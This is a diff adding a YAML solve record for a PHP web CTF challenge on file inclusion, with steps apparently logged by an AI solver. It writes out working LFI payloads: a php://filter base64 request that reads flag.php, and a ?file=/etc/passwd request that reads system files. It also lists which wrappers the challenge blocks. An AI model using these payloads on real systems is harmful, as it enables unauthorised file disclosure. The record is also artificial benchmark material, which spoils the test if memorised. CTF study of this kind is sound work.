@@ -1,0 +1,19 @@
+name: '[ACTF2020 新生赛]Include 20578766d159'
+category: web
+keywords:
+- actf2020
+- include
+- y1ng
+steps:
+- '[claude] GET /?file=php://filter/convert.base64-encode/resource=flag.php returns
+  base64 of flag.php source; decoded contains the flag. Confirmed: LFI, no block on
+  php://filter (only php://input, zip://, phar:/'
+- '[claude] ?file=/etc/passwd reads arbitrary files (Alpine container).'
+- '[claude] Evidence saved: `evidence/filter_resp.txt` (raw base64) and `evidence/flag_source.txt`
+  (decoded source).'
+evidence_chain:
+- '[claude] Evidence saved: `evidence/filter_resp.txt` (raw base64) and `evidence/flag_source.txt`
+  (decoded source).'
+success_format: CTF2\{[^}]+\}
+source: 20578766-d159-4e64-8de0-4bc64debe536 (solver df8e796d-c7a9-43be-9e11-79aaac355057)
+notes: ''
